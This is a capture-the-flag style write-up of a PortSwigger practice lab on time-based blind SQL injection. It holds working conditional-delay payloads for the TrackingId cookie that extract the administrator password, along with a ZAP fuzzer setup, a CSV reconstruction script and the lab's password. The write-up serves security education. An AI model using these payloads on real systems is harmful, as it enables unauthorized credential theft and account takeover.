# Blind SQL Injection with Time Delays and Information Retrieval

> This writeup follows the OWASP Web Security Testing Guide (WSTG) methodology.

---

## Goal

Exploit the SQL injection vulnerability to find the password of the `administrator` user and log in.

---

## Lab

https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval

---

## OWASP Category

A03:2021 – Injection

---

## Core Concept

Same as lab_10 — we use **response time** as our only data channel. But now instead of just triggering a delay, we use **conditional time delays** to extract data character by character.

```
Condition TRUE  → delay fires → response takes 10 seconds → correct character 
Condition FALSE → no delay   → response is instant        → wrong character 
```

We combine `CASE WHEN` with a sleep function so the delay only fires when our guessed character is correct:

```sql
CASE WHEN (condition is true) THEN pg_sleep(10) ELSE pg_sleep(0) END
```

---

## Time Delay Functions by Database

| Database | Conditional Delay Query |
|----------|------------------------|
| PostgreSQL | `'%3BSELECT CASE WHEN (condition) THEN pg_sleep(10) ELSE pg_sleep(0) END--` |
| MySQL | `' AND SLEEP(10)=IF(condition,1,0)--` |
| MSSQL | `'; IF (condition) WAITFOR DELAY '0:0:10'--` |
| Oracle | `'| |CASE WHEN (condition) THEN dbms_pipe.receive_message('a',10) ELSE '' END--` |

---

## Steps to Solve

---

**Step 1 — Confirm Injection Point**

The injection point is the **TrackingId** cookie. Confirm no response difference with any payload:

```http
Cookie: TrackingId=xyz'
Cookie: TrackingId=xyz' AND '1'='1
Cookie: TrackingId=xyz' AND '1'='2
```

All return same response — confirms **pure blind SQLi**.

<img width="369" height="99" alt="image" src="https://github.com/user-attachments/assets/42dcb835-d9d4-49ac-96ed-050d901033a1" />

---

**Step 2 — Identify the Database**

Test delay syntax for each database one by one:

**PostgreSQL:**
```http
Cookie: TrackingId=xyz'||pg_sleep(10)--
```

**MySQL:**
```http
Cookie: TrackingId=xyz' AND SLEEP(10)--
```

**MSSQL:**
```http
Cookie: TrackingId=xyz'; WAITFOR DELAY '0:0:10'--
```

**Oracle:**
```http
Cookie: TrackingId=xyz'||dbms_pipe.receive_message(('a'),10)--
```

The one that delays **~10 seconds** = confirmed database.
It's **PostgreSQL**.

<img width="1846" height="121" alt="image" src="https://github.com/user-attachments/assets/85897f1f-b96b-4486-9a7e-2a595a7d6591" />


---

**Step 3 — Confirm Conditional Delay Works**

Before extracting data, confirm the condition-based delay fires correctly.

**False condition → should be instant (0 seconds):**
```http
Cookie: TrackingId=xyz'%3BSELECT CASE WHEN (1=2) THEN pg_sleep(5) ELSE pg_sleep(0) END--
```

**True condition → should delay 5 seconds:**
```http
Cookie: TrackingId=xyz'%3BSELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--
```

> **Why `%3B`?** This is URL-encoded `;` (semicolon). We need it to start a new SQL statement for PostgreSQL.

<img width="1894" height="80" alt="image" src="https://github.com/user-attachments/assets/7c32887d-da34-4db3-82b8-260ab5fa7505" />


---

**Step 4 — Confirm Administrator Exists**

```http
Cookie: TrackingId=xyz'%3BSELECT CASE WHEN (username='administrator') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
```

Response delays **10 seconds** → administrator user exists 

<img width="1834" height="64" alt="image" src="https://github.com/user-attachments/assets/a3e0f255-ee8e-496a-8e00-582f4b026974" />

---

**Step 5 — Find Password Length**

Test password length by incrementing the number until the delay stops:

```http
Cookie: TrackingId=xyz'%3BSELECT CASE WHEN (username='administrator' AND LENGTH(password)>1) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--

Cookie: TrackingId=xyz'%3BSELECT CASE WHEN (username='administrator' AND LENGTH(password)>10) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--

Cookie: TrackingId=xyz'%3BSELECT CASE WHEN (username='administrator' AND LENGTH(password)>19) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--

Cookie: TrackingId=xyz'%3BSELECT CASE WHEN (username='administrator' AND LENGTH(password)=20) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
```

- Delay fires → condition true → keep incrementing
- No delay → condition false → previous number was the length

<img width="1248" height="912" alt="image" src="https://github.com/user-attachments/assets/70584441-028b-4eee-860c-40b453616689" />

Password length found: **20 characters**

---

**Step 6 — Extract Password with ZAP Fuzzer**

Now we extract each character one by one using the fuzzer.

**Base query:**
```http
Cookie: TrackingId=xyz'%3BSELECT CASE WHEN (username='administrator' AND SUBSTRING(password,§1§,1)='§a§') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
```

**ZAP Fuzzer Setup:**

Mark two payload positions:
- `§1§` → position number
- `§a§` → character guess

**Payload 1** — Position number:
```
Type: Numberzz
Start: 1
End: 20
Increment: 1
```

**Payload 2** — Character guess:
```
Type: File
File: chars.txt (a-z, 0-9, special chars)
```

**How to identify correct characters:**

In ZAP Fuzzer results look at the **RTT (Round Trip Time)** column:

| RTT | Meaning |
|-----|---------|
| ~10000ms (10 seconds) | Correct character — delay fired |
| ~500ms (instant) |  Wrong character — no delay |

Sort by **RTT column descending** → all correct characters appear at top.

<img width="1887" height="554" alt="image" src="https://github.com/user-attachments/assets/7b2e9ddd-e896-4b93-8f23-487f6a6c197b" />

---

**Step 7 — Reconstruct Password from ZAP CSV**

Export ZAP results as CSV then run the Python script:

```python
import csv

with open('Untitled.csv', 'r') as f:
    results = {}
    for row in csv.DictReader(f):
        if int(row['RTT']) > 9000:
            p = row['Payloads'].strip('[]"').split(', ')
            results[int(p[0])] = p[1].strip('"')

print("Password:", ''.join(results[k] for k in sorted(results)))
```

<img width="299" height="45" alt="image" src="https://github.com/user-attachments/assets/da760bb3-80a2-40bb-8690-b2f7ce25364a" />

---

**Step 8 — Log In as Administrator**

Navigate to the login page and enter:

- **Username:** `administrator`
- **Password:** `g9g99p9qi82vzak3ev0o`

<!-- Screenshot: Show successful login -->

---

**Lab Solved**

<img width="1533" height="727" alt="image" src="https://github.com/user-attachments/assets/d4d6af88-5018-43d1-888d-3a67b913cf58" />

---

## Full Payload Reference

| Goal | Query |
|------|-------|
| Confirm delay | `xyz'\|\|pg_sleep(10)--` |
| False condition | `xyz'%3BSELECT CASE WHEN (1=2) THEN pg_sleep(10) ELSE pg_sleep(0) END--` |
| True condition | `xyz'%3BSELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--` |
| Confirm user | `xyz'%3BSELECT CASE WHEN (username='administrator') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--` |
| Password length | `xyz'%3BSELECT CASE WHEN (username='administrator' AND LENGTH(password)=20) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--` |
| Extract char | `xyz'%3BSELECT CASE WHEN (username='administrator' AND SUBSTRING(password,§1§,1)='§a§') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--` |

---

## How This Differs from Previous Labs

| | Conditional Response | Conditional Error | Visible Error | Time Delay |
|--|--|--|--|--|
| Data channel | Response body | Status code | Error message | **Response time** |
| True condition | Welcome back! | 500 error | Data in error | **Slow response** |
| False condition | No message | 200 normal | No error | **Fast response** |
| Identify correct char by | Body size | Status code | Error text | **RTT in ms** |
| Requests per value | One per char | One per char | One per col | **One per char** |

---

*This writeup is intended for educational purposes only. All techniques documented here were performed on PortSwigger's intentionally vulnerable practice platform. The author does not encourage or condone the use of these methods against any system without explicit written permission. Unauthorized use of these techniques may violate applicable laws and regulations.*
